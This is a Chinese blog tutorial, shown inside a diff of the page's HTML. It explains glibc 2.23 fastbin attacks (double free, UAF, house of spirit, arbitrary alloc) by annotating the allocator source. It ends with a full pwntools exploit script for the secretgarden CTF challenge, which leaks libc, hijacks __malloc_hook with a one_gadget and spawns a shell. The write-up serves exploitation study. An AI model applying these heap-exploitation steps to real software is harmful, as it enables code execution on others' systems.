+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      20
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Fastbin Attack</h1>
+            
+            <div class="markdown-body">
+              <p>要了解fastbin attack，首先得了解fastbin机制。由于libc2.26后加入了tcache机制，我们这里就分析glibc 2.23.<br>下面代码选自glibc2.23</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> _int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  size = chunksize (p);    <span class="comment">//获取p的size</span></span><br><span class="line">  check_inuse_chunk(av, p);<span class="comment">//检查p的物理相邻的下一个堆块的inuse位是否置1</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//检查p的大小是否小于global_max_fast</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line">      <span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">          <span class="comment">//检查p物理相邻的堆块是否是top chunk</span></span><br><span class="line">          &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">      <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      ) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//检查p的物理相邻下个堆块是否存在,且大小是否满足最小和最大要求</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">	       || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">			     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        &#123;.......&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//对chunk的data块通过memset赋值，但是默认情况下是不进行操作    </span></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">    <span class="comment">//设置 malloc_state的flag</span></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取p对应大小的fastbinY的索引</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    <span class="comment">//fb指向对应大小的fastbinY的地址</span></span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    <span class="comment">// old为 对应大小的fastbinY的fd值，也就是第一个对块的地址</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">      	 <span class="comment">// Check that the top of the bin is not the record we are going to add</span></span><br><span class="line">         <span class="comment">//检查 fastbin中对应的bin的第一项 是否 等于 p (新加入的堆块)</span></span><br><span class="line">        	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      	  &#123;</span><br><span class="line">      	    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">      	    <span class="keyword">goto</span> errout;</span><br><span class="line">      	  &#125;</span><br><span class="line">          <span class="comment">//获取 fastbin中对应的bin的第一项的索引。</span></span><br><span class="line">        	<span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">        	  old_idx = fastbin_index(chunksize(old));</span><br><span class="line">          <span class="comment">//让  p 的fd指向 顶部的fastbin块</span></span><br><span class="line">        	p-&gt;fd = old2 = old;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line">    <span class="comment">//catomic_compare_and_exchange_val_rel 功能是 如果*fb等于old2，则将*fb存储为p，返回old2；</span></span><br><span class="line">    <span class="comment">// *fb=p 也就是 让对应fastbin的fd指向 p(新加入的堆块)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查fastbin中对应的bin的第一项的大小是否与p(要添加的块)的大小相同。</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        	errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">        	<span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看到fastbin只是检查了fastbin第一个chunk是否与新加入的chunk相同。所以我们可以使用free(0) free(1) free(0)的方式来达到double free。之后还检查大小满足要求，通过size算出fastbin_index然后再比对。如果对应的fastbinY大小为0x70,64位的话size可以在0~0xF之间浮动，也就是说size为0x70-0x7f都会被认为是合法的。32位同理，在0-0x7之间浮动。</p>
+<p><strong>利用前提：</strong><br>1、能创建fastbin类型的chunk<br>2、存在堆溢出、use-after-free等能控制chunk内容的漏洞<br>如果细分的话，可以做以下的分类：<br>3、fastbin double free<br>即利用double free漏洞构造chunk如下图所示<br><img src="/2021/06/19/fastbin-attack/1.jpg" srcset="/img/loading.gif" lazyload alt="1.jpg"><br>我们首先申请回chunk1然后修改其fd值指向一个fake_chunk，这里的chunk要保证size域合法，我们再次申请3次同样的chunk,就会依次拿到chunk2，chunk1，fake_chunk。我们只要在关键位置伪造fake_chunk就可以了。例如在malloc_hook左右伪造fake_chunk，然后修改malloc_hook的值为one_gadget就可以在调用malloc时get_shell。</p>
+<h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><p>同fastbin double free利用手法类似，只不过只需要free依次，然后修改FD指针指向fake_chunk。</p>
+<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h1><p>该技术的核心在于目标位置处伪造fastbin chunk，并将其释放，再申请回来，从而达到分配指定地址的chunk的目的。<br>    ### 可以free你指定位置的fake_chunk<br>    ### 要想构造fastbin fake chunk，并且将其释放时，可以将其放入到对应的fastbin链表当中，需要绕过一些必要的检测，即<br>        ##### fake chunk的ISMMAP位不能为1，因为free时，如果是mmap的chunk，就会单独处理。<br>        ##### fake chunk地址需要对齐，32位8字节对齐，64位16字节对齐<br>          ##### fake chunk的size大小需要满足fastbin的需求<br>          ##### fake chunk的next chunk的大小合理</p>
+<h1 id="alloc-to-stack"><a href="#alloc-to-stack" class="headerlink" title="alloc to stack"></a>alloc to stack</h1><p>该技术的核心点在于劫持fastbin链表中的chunk的fd指针，把fd指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p>
+<h1 id="arbitrary-alloc"><a href="#arbitrary-alloc" class="headerlink" title="arbitrary alloc"></a>arbitrary alloc</h1><p>arbitrary alloc 其实与alloc to stack是完全相同的，唯一的区别就是分配的目标不是在栈中。我们可以把chunk分配到任意可写的内存中，比如bss、heap、data、stack等等。</p>
+<h1 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h1><p>以上是fastbin attack的集中方法，总结起来就是3步：<br>①伪造合理的chunk<br>②使得fd指向fake_chunk，或者free fake_chunk。使得fake_chunk加入到fastbin中<br>③分配得到fake_chunk，进行后续利用</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>hitcontraining_secretgarden，libc为2.23<br>首先检查一下保护<br><img src="/2021/06/19/fastbin-attack/2.jpg" srcset="/img/loading.gif" lazyload alt="2.jpg"><br>main函数，有增删查，没有改<br><img src="/2021/06/19/fastbin-attack/3.jpg" srcset="/img/loading.gif" lazyload alt="3.jpg"><br>漏洞点,del函数free的时候指针没有清零。并且free前没有检查flowerlist[i][0]的值是否为1<br><img src="/2021/06/19/fastbin-attack/4.jpg" srcset="/img/loading.gif" lazyload alt="4.jpg"><br>其他都是常规操作</p>
+<p>程序留有后门，我们也可以劫持函数的got来实现调用后门。但是我们这里使用的是劫持__malloc_hook，由于one_gadget不能用，我们通过__libc_realloc来改变栈环境，使得one_gadget条件成立。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./secretgarden&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">length,name,color</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name :&#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;flower :&#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;flower :&#x27;</span>,color)<span class="comment">#0x17</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;garden:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#----------------leak libc ---------------#</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x80</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">0x80</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#将其置入unsorted bin</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;E&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#2</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;EEEEEEEE&#x27;</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base: &#x27;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#-------------- double free ---------------#</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>) <span class="comment">#fastbinY(0x70) -&gt; 3 -&gt; 4 -&gt;3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------fastbin attack --------------#</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>),<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(libc_base+libc.symbols[<span class="string">&#x27;__libc_realloc&#x27;</span>]+<span class="number">8</span>),<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/06/19/pwn%E5%AD%A6%E4%B9%A0%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E5%8F%82%E8%80%83/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Pwn学习思维导图参考</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/06/19/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/">
+                        <span class="hidden-mobile">Linux动态内存管理机制</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Saku376/commit-utterance');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
     
 
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
-<script src="/js/jquery-3.4.1.min.js"></script>
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
 
 
 
   
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
 
 
 
 
-<script src="/js/script.js"></script>
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
 
 
 
 
 
-  </div>
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
 </body>
 </html>
